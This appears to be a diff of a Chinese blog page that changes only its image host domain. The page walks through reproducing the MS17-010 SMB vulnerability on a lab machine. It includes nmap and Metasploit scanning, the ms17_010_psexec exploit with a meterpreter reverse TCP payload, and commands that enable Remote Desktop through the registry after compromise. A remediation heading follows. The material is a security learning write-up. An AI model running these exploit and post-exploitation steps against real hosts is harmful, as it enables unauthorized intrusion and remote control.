@@ -8,7 +8,7 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 详细扫描</span><br><span class="line">$ sudo nmap 192.168.0.205 -sV -v -A -T4 -p445 -O</span><br><span class="line"></span><br><span class="line">// 利用 MS17-010 脚本扫描</span><br><span class="line">$ nmap --script smb-vuln-ms17-010.nse 192.168.0.205</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/05/05/ms17010/1.png" alt="1"></p>
+<p><img src="//mucfo.cn/2019/05/05/ms17010/1.png" alt="1"></p>
 <p>可知目标主机含有 MS17-010 漏洞。</p>
 <ul>
 <li>利用 msf 扫描</li>
@@ -16,7 +16,7 @@
 <p>使用模块</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt; search ms17-010</span><br><span class="line">msf&gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">msf&gt; show options</span><br><span class="line">msf&gt; set RHOST 192.168.0.205</span><br><span class="line">msf&gt; set THREAD 20</span><br><span class="line">msf&gt; show options</span><br><span class="line">msf&gt; run</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/05/05/ms17010/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-26%20%e4%b8%8b%e5%8d%889.30.46.png" alt="屏幕快照 2019-12-26 下午9.30.46"></p>
+<p><img src="//mucfo.cn/2019/05/05/ms17010/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-26%20%e4%b8%8b%e5%8d%889.30.46.png" alt="屏幕快照 2019-12-26 下午9.30.46"></p>
 <p>确认目标主机含有 MS17-010 漏洞。</p>
 </li>
 <li><p>⚙️ <strong>漏洞复现</strong></p>
@@ -24,11 +24,11 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 寻找 ms17-010 相关模块</span><br><span class="line">msf&gt; search ms17-010</span><br><span class="line"></span><br><span class="line">// 使用 exploit 漏洞利用（auxiliary “辅助的”）</span><br><span class="line">msf&gt; use windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">// 可选择目标系统具体版本</span><br><span class="line">msf&gt; show targets</span><br><span class="line"></span><br><span class="line">// 显示所有可用的 payload，选择合适的，这里选择 tcp 反弹</span><br><span class="line">msf&gt; show payloads</span><br><span class="line">msf&gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf&gt; show options</span><br><span class="line">msf&gt; set RHOST 192.168.0.205	// 设定 target 主机		</span><br><span class="line">msf&gt; set LHOST 192.168.0.105	// 设定接收反弹 session 的主机 IP</span><br><span class="line"></span><br><span class="line">// 检查目标系统是否可以漏洞利用</span><br><span class="line">msf&gt; check</span><br><span class="line"></span><br><span class="line">// run 或者 exploit</span><br><span class="line">msf&gt; run</span><br></pre></td></tr></table></figure>
 
 <p>接收到反弹 session 后弹出 meterpreter，输入 shell 获得主机 shell。</p>
-<p><img src="//naykcin.top/2019/05/05/ms17010/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-26%20%e4%b8%8b%e5%8d%889.48.37.png" alt="屏幕快照 2019-12-26 下午9.48.37"></p>
+<p><img src="//mucfo.cn/2019/05/05/ms17010/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-26%20%e4%b8%8b%e5%8d%889.48.37.png" alt="屏幕快照 2019-12-26 下午9.48.37"></p>
 <p>接着便可以开始创建用户、添加管理员组、开启远程桌面、Kali 连接远程桌面。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOS 下开启 3389 端口，并修改端口号，目标为 Windows XP，测试有效</span><br><span class="line"></span><br><span class="line">// 启动服务</span><br><span class="line">meterpreter&gt; sc config termservice start= auto</span><br><span class="line">meterpreter&gt; net start termservice</span><br><span class="line"></span><br><span class="line">// 允许外连</span><br><span class="line">meterpreter&gt; reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x0 /f</span><br><span class="line"></span><br><span class="line">// Kali 远程桌面连接</span><br><span class="line">root@Kali:~# rdesktop 192.168.0.205</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/05/05/ms17010/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-26%20%e4%b8%8b%e5%8d%8810.04.34.png" alt="屏幕快照 2019-12-26 下午10.04.34"></p>
+<p><img src="//mucfo.cn/2019/05/05/ms17010/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-26%20%e4%b8%8b%e5%8d%8810.04.34.png" alt="屏幕快照 2019-12-26 下午10.04.34"></p>
 </li>
 </ol>
 <h3 id="📍-修复建议"><a href="#📍-修复建议" class="headerlink" title="📍 修复建议"></a>📍 修复建议</h3><ul>
